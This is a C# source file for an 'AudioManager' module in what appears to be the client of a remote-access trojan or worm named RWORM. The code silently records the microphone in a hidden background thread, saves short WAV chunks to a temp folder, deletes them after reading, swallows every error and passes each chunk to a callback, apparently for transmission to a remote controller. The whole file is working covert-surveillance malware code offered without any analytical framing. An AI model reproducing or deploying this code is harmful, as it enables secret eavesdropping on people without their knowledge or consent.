using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace RWORM.Client.Modules
{
    public class AudioManager : IDisposable
    {
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi)]
        private static extern int mciSendString(string command, StringBuilder? buffer, int bufferSize, IntPtr hwndCallback);

        private bool _recording;
        private Thread? _worker;
        private readonly Func<byte[], Task> _onChunk;

        public AudioManager(Func<byte[], Task> onChunk)
        {
            _onChunk = onChunk;
        }

        public void Start()
        {
            if (_recording) return;
            _recording = true;

            _worker = new Thread(() =>
            {
                int chunkIndex = 0;
                string tempDir = Path.Combine(Path.GetTempPath(), "rworm_audio");
                try { Directory.CreateDirectory(tempDir); } catch { }

                while (_recording)
                {
                    string alias = "rec_" + (chunkIndex++);
                    string filePath = Path.Combine(tempDir, $"{alias}.wav");

                    try
                    {
                        
                        int openRes = mciSendString($"open new type waveaudio alias {alias}", null, 0, IntPtr.Zero);
                        if (openRes == 0)
                        {
                            
                            mciSendString($"set {alias} time format ms", null, 0, IntPtr.Zero);

                            
                            mciSendString($"record {alias}", null, 0, IntPtr.Zero);

                            
                            int waited = 0;
                            while (_recording && waited < 1500)
                            {
                                Thread.Sleep(100);
                                waited += 100;
                            }

                            
                            mciSendString($"stop {alias}", null, 0, IntPtr.Zero);
                            mciSendString($"save {alias} \"{filePath}\"", null, 0, IntPtr.Zero);
                            mciSendString($"close {alias}", null, 0, IntPtr.Zero);

                            if (File.Exists(filePath))
                            {
                                byte[] wavBytes = File.ReadAllBytes(filePath);
                                try { File.Delete(filePath); } catch { }

                                if (wavBytes.Length > 44)
                                {
                                    try
                                    {
                                        _onChunk(wavBytes).Wait(500);
                                    }
                                    catch { }
                                }
                            }
                        }
                        else
                        {
                            Thread.Sleep(500);
                        }
                    }
                    catch
                    {
                        try { mciSendString($"close {alias}", null, 0, IntPtr.Zero); } catch { }
                        Thread.Sleep(500);
                    }
                }
            });
            _worker.IsBackground = true;
            _worker.Start();
        }

        public void Stop()
        {
            _recording = false;
            try
            {
                if (_worker != null && _worker.IsAlive)
                {
                    _worker.Join(2000);
                }
            }
            catch { }
        }

        public void Dispose() => Stop();
    }
}
